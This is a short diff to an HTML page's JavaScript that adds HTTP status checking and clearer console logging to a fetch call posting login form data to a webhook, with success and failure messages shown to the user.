@@ -40,9 +40,17 @@
                     method: "POST",
                     body: formData
                 })
-                .then(response => response.text())
+                .then(response => {
+                    console.log("Response Status:", response.status);
+
+                    if (!response.ok) { 
+                        throw new Error(`HTTP error! Status: ${response.status}`);
+                    }
+
+                    return response.text();
+                })
                 .then(data => {
-                    console.log("Webhook response:", data);
+                    console.log("Response Data:", data);
                     
                     // ✅ Show success message
                     let messageBox = document.getElementById("message");
@@ -51,9 +59,9 @@
                     messageBox.style.display = "block";
                 })
                 .catch(error => {
-                    console.error("Error:", error);
+                    console.error("Fetch Error:", error);
 
-                    // ❌ Show error message if request fails
+                    // ❌ Show error message
                     let messageBox = document.getElementById("message");
                     messageBox.innerText = "Login Failed. Please try again.";
                     messageBox.style.color = "red";
@@ -65,6 +73,7 @@
 
 </body>
 </html>
+
 
 
 
